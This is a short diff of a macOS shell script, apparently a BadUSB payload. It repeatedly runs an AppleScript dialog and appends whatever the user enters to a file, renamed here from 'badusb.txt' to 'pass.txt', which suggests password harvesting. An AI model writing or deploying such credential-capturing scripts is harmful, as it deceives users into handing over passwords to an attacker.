@@ -11,13 +11,13 @@ EOF
 
 dialogText=$(osascript -e "$applescriptCode");
 
-echo $dialogText >>  badusb.txt;
+echo $dialogText >>  pass.txt;
 
 dialogText=$(osascript -e "$applescriptCode");
 
-echo $dialogText >>  badusb.txt;
+echo $dialogText >>  pass.txt;
 
 dialogText=$(osascript -e "$applescriptCode");
 
-echo $dialogText >>  badusb.txt;
+echo $dialogText >>  pass.txt;
 
